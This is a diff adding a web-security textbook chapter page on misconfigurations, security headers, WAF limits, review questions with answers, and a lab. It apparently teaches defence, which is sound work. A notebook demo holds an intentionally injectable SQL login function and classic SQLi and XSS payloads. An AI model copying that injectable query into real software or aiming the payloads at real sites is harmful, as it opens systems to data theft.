+the Secure attribute ensures they are sent only over TLS.</p>
+</section>
+</section>
+</section>
+<hr class="docutils" />
+<section id="security-misconfigurations">
+<h2><span class="section-number">10.6. </span>Security Misconfigurations<a class="headerlink" href="#security-misconfigurations" title="Link to this heading">#</a></h2>
+<p>Security misconfiguration is the fifth-ranked OWASP risk and is extremely common. Examples:
+default credentials left on administrative interfaces, unnecessary features enabled (debug mode,
+unnecessary HTTP methods), verbose error messages exposing stack traces, directory listing enabled,
+missing security headers (CSP, HSTS, X-Frame-Options).</p>
+<section id="security-headers">
+<h3><span class="section-number">10.6.1. </span>Security Headers<a class="headerlink" href="#security-headers" title="Link to this heading">#</a></h3>
+<div class="pst-scrollable-table-container"><table class="table">
+<thead>
+<tr class="row-odd"><th class="head"><p>Header</p></th>
+<th class="head"><p>Purpose</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>Content-Security-Policy</p></td>
+<td><p>Restrict sources of scripts, styles, and media</p></td>
+</tr>
+<tr class="row-odd"><td><p>Strict-Transport-Security</p></td>
+<td><p>Force HTTPS for the defined period</p></td>
+</tr>
+<tr class="row-even"><td><p>X-Frame-Options</p></td>
+<td><p>Prevent clickjacking via iframe</p></td>
+</tr>
+<tr class="row-odd"><td><p>X-Content-Type-Options: nosniff</p></td>
+<td><p>Prevent MIME-type sniffing</p></td>
+</tr>
+<tr class="row-even"><td><p>Referrer-Policy</p></td>
+<td><p>Control referrer header on cross-origin requests</p></td>
+</tr>
+<tr class="row-odd"><td><p>Permissions-Policy</p></td>
+<td><p>Restrict browser features (camera, mic, geolocation)</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="web-application-firewalls-and-their-limits">
+<h2><span class="section-number">10.7. </span>Web Application Firewalls and Their Limits<a class="headerlink" href="#web-application-firewalls-and-their-limits" title="Link to this heading">#</a></h2>
+<p>A WAF inspects HTTP requests and blocks or logs those matching malicious patterns. It provides
+a useful additional layer against known attack signatures and automated scanners, and can virtually
+patch a vulnerable application while a permanent fix is being developed.</p>
+<section id="waf-bypass-techniques">
+<h3><span class="section-number">10.7.1. </span>WAF Bypass Techniques<a class="headerlink" href="#waf-bypass-techniques" title="Link to this heading">#</a></h3>
+<p>WAFs can be bypassed via encoding tricks (double URL-encoding, Unicode variants), HTTP request
+smuggling, case variation, and payload fragments that individually pass rules but combine to an
+attack. A WAF is not a substitute for secure code; it is a compensating control for vulnerabilities
+that cannot be immediately remediated.</p>
+</section>
+</section>
+<hr class="docutils" />
+<section id="why-this-matters">
+<h2><span class="section-number">10.8. </span>Why This Matters<a class="headerlink" href="#why-this-matters" title="Link to this heading">#</a></h2>
+<p>Web applications are the primary attack surface for most organisations: they are internet-facing,
+complex, written by many developers over years, and directly handle sensitive data. The OWASP Top 10
+risks are found in the majority of applications tested; they are not rare edge cases. A developer
+who understands injection, XSS, and broken auth and applies the corresponding fixes as a matter of
+routine produces far fewer vulnerabilities than one who relies on scanners to catch what they missed.</p>
+</section>
+<hr class="docutils" />
+<section id="news-in-focus">
+<h2><span class="section-number">10.9. </span>News in Focus<a class="headerlink" href="#news-in-focus" title="Link to this heading">#</a></h2>
+<p>SQL injection vulnerabilities in web applications continue to produce major breaches despite being
+one of the oldest and best-understood vulnerability classes. Several headline breaches of credit
+card processors, retailers, and government agencies in the last decade were attributed to SQLi in
+applications that were not using parameterised queries, despite the fix being well-documented since
+the late 1990s. The persistence of this vulnerability class reflects the cost of not making secure
+coding practices a hiring and review requirement.</p>
+<hr class="docutils" />
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Chapter 10 -- Safe SQLi demonstration with SQLite</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span><span class="o">,</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="c1"># ── Safe vs unsafe query comparison ────────────────────────────────────────────</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;:memory:&quot;</span><span class="p">)</span>
+<span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+<span class="n">cur</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span>
+    <span class="s2">&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT);&quot;</span>
+    <span class="s2">&quot;INSERT INTO users VALUES (1,&#39;alice&#39;,&#39;admin&#39;);&quot;</span>
+    <span class="s2">&quot;INSERT INTO users VALUES (2,&#39;bob&#39;,&#39;user&#39;);&quot;</span>
+    <span class="s2">&quot;INSERT INTO users VALUES (3,&#39;carol&#39;,&#39;user&#39;);&quot;</span>
+<span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">unsafe_login</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="c1"># NEVER do this in real code</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;DB ERROR: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">]</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">safe_login</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="c1"># Parameterised query: data can NEVER become code</span>
+    <span class="k">return</span> <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=== Safe vs Unsafe SQL Query Demo ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">tests</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="s2">&quot;Normal input&quot;</span><span class="p">,</span>        <span class="s2">&quot;alice&quot;</span><span class="p">),</span>
+    <span class="p">(</span><span class="s2">&quot;SQLi bypass attempt&quot;</span><span class="p">,</span> <span class="s2">&quot;&#39; OR 1=1 --&quot;</span><span class="p">),</span>
+    <span class="p">(</span><span class="s2">&quot;Union extraction&quot;</span><span class="p">,</span>    <span class="s2">&quot;&#39; UNION SELECT id,username,role FROM users --&quot;</span><span class="p">),</span>
+<span class="p">]</span>
+
+<span class="k">for</span> <span class="n">label</span><span class="p">,</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">tests</span><span class="p">:</span>
+    <span class="n">unsafe_result</span> <span class="o">=</span> <span class="n">unsafe_login</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">safe_result</span>   <span class="o">=</span> <span class="n">safe_login</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Input (</span><span class="si">{</span><span class="n">label</span><span class="si">}</span><span class="s2">): </span><span class="si">{</span><span class="n">payload</span><span class="si">!r}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Unsafe query returned : </span><span class="si">{</span><span class="n">unsafe_result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Safe query returned   : </span><span class="si">{</span><span class="n">safe_result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">()</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1"># ── XSS output encoding demo ──────────────────────────────────────────────────</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
+
+<span class="n">xss_payloads</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&#39;</span><span class="p">,</span>
+    <span class="s2">&quot;javascript:alert(&#39;xss&#39;)&quot;</span><span class="p">,</span>
+<span class="p">]</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=== XSS Output Encoding Demo ===&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">xss_payloads</span><span class="p">:</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Raw    : </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Encoded: </span><span class="si">{</span><span class="n">encoded</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>=== Safe vs Unsafe SQL Query Demo ===
+
+  Input (Normal input): &#39;alice&#39;
+    Unsafe query returned : [(1, &#39;alice&#39;, &#39;admin&#39;)]
+    Safe query returned   : [(1, &#39;alice&#39;, &#39;admin&#39;)]
+
+  Input (SQLi bypass attempt): &quot;&#39; OR 1=1 --&quot;
+    Unsafe query returned : [(1, &#39;alice&#39;, &#39;admin&#39;), (2, &#39;bob&#39;, &#39;user&#39;), (3, &#39;carol&#39;, &#39;user&#39;)]
+    Safe query returned   : []
+
+  Input (Union extraction): &quot;&#39; UNION SELECT id,username,role FROM users --&quot;
+    Unsafe query returned : [(1, &#39;alice&#39;, &#39;admin&#39;), (2, &#39;bob&#39;, &#39;user&#39;), (3, &#39;carol&#39;, &#39;user&#39;)]
+    Safe query returned   : []
+
+=== XSS Output Encoding Demo ===
+  Raw    : &lt;script&gt;alert(1)&lt;/script&gt;
+  Encoded: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+
+  Raw    : &quot;&gt;&lt;img src=x onerror=alert(1)&gt;
+  Encoded: &amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;
+
+  Raw    : javascript:alert(&#39;xss&#39;)
+  Encoded: javascript:alert(&amp;#x27;xss&amp;#x27;)
+</pre></div>
+</div>
+</div>
+</div>
+</section>
+<section id="review-questions-mcq">
+<h2><span class="section-number">10.10. </span>Review Questions (MCQ)<a class="headerlink" href="#review-questions-mcq" title="Link to this heading">#</a></h2>
+<p><strong>Q1.</strong> The root cause of SQL injection is:
+A. Using a database  B. Constructing queries by concatenating user-supplied strings  C. Using HTTP  D. Missing HTTPS</p>
+<p><strong>Q2.</strong> A parameterised query prevents SQLi because:
+A. It encrypts the query  B. Data is sent separately from query structure and cannot become SQL code  C. It validates input length  D. It uses a stored procedure</p>
+<p><strong>Q3.</strong> Stored XSS is more dangerous than reflected XSS because:
+A. It affects more browsers  B. It persists in the database and executes for every victim who views the page  C. It is harder to detect  D. It bypasses TLS</p>
+<p><strong>Q4.</strong> CSRF is mitigated by the SameSite=Strict cookie attribute because:
+A. Cookies are encrypted  B. Cookies are not sent with cross-origin requests  C. The cookie expires immediately  D. The cookie is HttpOnly</p>
+<p><strong>Q5.</strong> SSRF in a cloud environment is particularly severe because:
+A. It bypasses firewalls  B. The Instance Metadata Service exposes IAM credentials  C. It causes DDoS  D. It breaks TLS</p>
+<p><strong>Q6.</strong> IDOR vulnerabilities are in the OWASP category:
+A. Cryptographic Failures  B. Broken Access Control  C. Injection  D. Security Misconfiguration</p>
+<p><strong>Q7.</strong> The Content-Security-Policy header primarily mitigates:
+A. SQL injection  B. CSRF  C. XSS by restricting executable content sources  D. Session fixation</p>
+<p><strong>Q8.</strong> The HSTS header forces:
+A. HTTP-only connections  B. HTTPS-only connections for the defined period  C. Encrypted cookies  D. SameSite cookies</p>
+<p><strong>Q9.</strong> A WAF is best described as:
+A. A complete replacement for secure code  B. A compensating control that filters known attack patterns  C. A vulnerability scanner  D. An intrusion detection system</p>
+<p><strong>Q10.</strong> DOM-based XSS differs from reflected XSS in that the payload:
+A. Requires a database  B. Never touches the server; injected and executed entirely in the browser  C. Is persistent  D. Only works in Internet Explorer</p>
+<p><em>Answers: Q1 B, Q2 B, Q3 B, Q4 B, Q5 B, Q6 B, Q7 C, Q8 B, Q9 B, Q10 B.</em></p>
+</section>
+<section id="lab-assignment">
+<h2><span class="section-number">10.11. </span>Lab Assignment<a class="headerlink" href="#lab-assignment" title="Link to this heading">#</a></h2>
+<p><strong>Part A – SQLi</strong>: Using DVWA or SQLi-labs (locally), find and exploit at least two forms of SQL injection (error-based and blind). Document: the vulnerable parameter, the injection payload, the database version and at least one table name extracted.</p>
+<p><strong>Part B – XSS</strong>: In DVWA, find and demonstrate reflected, stored, and DOM-based XSS. For each, document: the injection point, the payload, and the impact (what could an attacker do with this XSS).</p>
+<p><strong>Part C – Security headers audit</strong>: Use <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">-I</span> <span class="pre">https://&lt;any-public-site&gt;</span></code> on three websites you are not targeting maliciously (large companies with public bug bounty programmes). Document which security headers are present and which are missing. Grade each site A-F.</p>
+<p><strong>Part D – CSRF protection analysis</strong>: Inspect the login and account-update forms of a web application you own or are authorised to test. Identify whether CSRF tokens are present, whether they are validated server-side, and whether SameSite attributes are set on session cookies.</p>
+</section>
+<section id="references">
+<h2><span class="section-number">10.12. </span>References<a class="headerlink" href="#references" title="Link to this heading">#</a></h2>
+<div class="docutils container" id="id2">
+<div role="list" class="citation-list">
+<div class="citation" id="id12" role="doc-biblioentry">
+<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id1">OWASPFoundation21</a><span class="fn-bracket">]</span></span>
+<p>OWASP Foundation. Owasp top 10:2021. <a class="reference external" href="https://owasp.org/Top10/">https://owasp.org/Top10/</a>, 2021.</p>
+</div>
+</div>
+</div>
+</section>
+</section>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            name: "python3",
+            path: "./chapters/10_web_security"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+                </article>
+              
+
+              
+              
+              
+              
+                <footer class="prev-next-footer d-print-none">
+                  
+<div class="prev-next-area">
+    <a class="left-prev"
+       href="../09_exploitation/chapter09.html"
+       title="previous page">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">previous</p>
+        <p class="prev-next-title"><span class="section-number">9. </span>Chapter 9: Exploitation and Post-Exploitation</p>
+      </div>
+    </a>
+    <a class="right-next"
+       href="../11_network_defense/chapter11.html"
+       title="next page">
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title"><span class="section-number">11. </span>Chapter 11: Network Defense and Hardening</p>
+      </div>
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
+</div>
+                </footer>
+              
+            </div>
+            
+            
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item"><div
+    id="pst-page-navigation-heading-2"
+    class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#learning-objectives">10.1. Learning Objectives</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#key-terms">10.2. Key Terms</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#the-owasp-top-10">10.3. The OWASP Top 10</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#broken-access-control">10.3.1. Broken Access Control</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#insecure-direct-object-references">10.3.1.1. Insecure Direct Object References</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#forced-browsing-and-path-traversal">10.3.1.2. Forced Browsing and Path Traversal</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#injection-attacks">10.4. Injection Attacks</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#sql-injection-in-depth">10.4.1. SQL Injection in Depth</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-based-sqli">10.4.1.1. Error-Based SQLi</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#union-based-sqli">10.4.1.2. Union-Based SQLi</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#blind-sqli">10.4.1.3. Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-scripting">10.4.2. Cross-Site Scripting</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#reflected-xss">10.4.2.1. Reflected XSS</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#stored-xss">10.4.2.2. Stored XSS</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dom-based-xss">10.4.2.3. DOM-Based XSS</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-request-forgery">10.4.3. Cross-Site Request Forgery</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#csrf-mitigations">10.4.3.1. CSRF Mitigations</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#server-side-request-forgery">10.4.4. Server-Side Request Forgery</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#authentication-and-session-management">10.5. Authentication and Session Management</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#broken-authentication">10.5.1. Broken Authentication</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#secure-password-storage">10.5.1.1. Secure Password Storage</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#session-management-best-practices">10.5.1.2. Session Management Best Practices</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#security-misconfigurations">10.6. Security Misconfigurations</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#security-headers">10.6.1. Security Headers</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#web-application-firewalls-and-their-limits">10.7. Web Application Firewalls and Their Limits</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#waf-bypass-techniques">10.7.1. WAF Bypass Techniques</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#why-this-matters">10.8. Why This Matters</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#news-in-focus">10.9. News in Focus</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#review-questions-mcq">10.10. Review Questions (MCQ)</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#lab-assignment">10.11. Lab Assignment</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#references">10.12. References</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+By Devharsh Trivedi, Ph.D., CISSP
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+
+  <p class="copyright">
+    
+      © Copyright 2026.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script defer src="../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf"></script>
+<script defer src="../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf"></script>
+
+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
